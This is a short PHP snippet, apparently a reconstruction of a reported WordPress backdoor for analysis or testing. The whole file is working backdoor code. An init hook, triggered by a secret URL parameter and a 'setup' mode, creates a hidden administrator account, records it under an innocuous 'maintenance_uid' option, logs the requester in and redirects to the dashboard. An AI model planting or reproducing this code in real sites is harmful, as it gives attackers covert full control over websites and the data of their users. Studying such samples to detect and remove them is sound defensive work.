<?php
// Reconstruction of the reported working variant's setup mode.
add_action('init', function () {
    if (!hash_equals('0123456789abcdef0123456789abcdef', (string) $_GET['f2b9faa21ebd'])) return;
    if (($_GET['m'] ?? '') !== 'setup') return;
    $uid = wp_insert_user(array(
        'user_login' => 'system_team850',
        'user_pass' => 'fixture-password-only',
        'user_email' => 'system_team850@example.com',
        'display_name' => 'System Team',
        'role' => 'administrator',
    ));
    if (is_wp_error($uid)) return;
    update_option('maintenance_uid', $uid);
    wp_set_current_user($uid);
    wp_set_auth_cookie($uid, true, is_ssl());
    wp_safe_redirect(admin_url('index.php'));
    exit;
});
